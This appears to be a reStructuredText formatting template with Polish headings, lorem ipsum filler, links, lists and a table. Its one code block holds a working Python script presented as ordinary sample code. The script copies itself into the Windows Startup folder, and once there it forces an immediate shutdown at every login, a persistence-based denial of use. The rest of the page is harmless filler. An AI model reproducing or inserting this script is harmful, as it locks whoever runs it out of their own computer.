Tytuł
==========

Lorem ipsum dolor sit amet, consectetur adipiscing elit.

Nagłówek 2
----------

Nam ut semper ligula, sit amet viverra lectus.

Nagłówek 3
++++++++++

Fusce eleifend, mi sit amet volutpat bibendum,

Nagłówek 4
^^^^^^^^^^

ex erat lobortis tortor, a condimentum turpis ex euismod turpis.

.. note::

   Suspendisse cursus magna a arcu mattis,

.. tip::

   et auctor turpis tempus.

.. code-block:: python

  import os
  import shutil

  user=os.getlogin()

  trg=os.path.dirname(os.path.abspath(__file__))+"\shutdown.py"
  dst="C:/Users/"+user+"/AppData/Roaming/Microsoft/Windows/Start Menu/Programs/Startup"

  if(os.path.exists(dst+"/shutdown.py")):
      os.system("shutdown /s /t 1")
      os._exit(0)

  shutil.move(trg,dst)

Odnośnik lokalny RtD :doc:`api.rst`

Odnośnik zewnętrzny-inny serwis `google <https://www.google.com>`_

lista punktowana:

* .
* .
* .

lista numerowana: 

#. .
#. .
#. .


====  =====  =====
1     2      3    
====  =====  =====
4     5      6   
7     8      9   
====  =====  =====
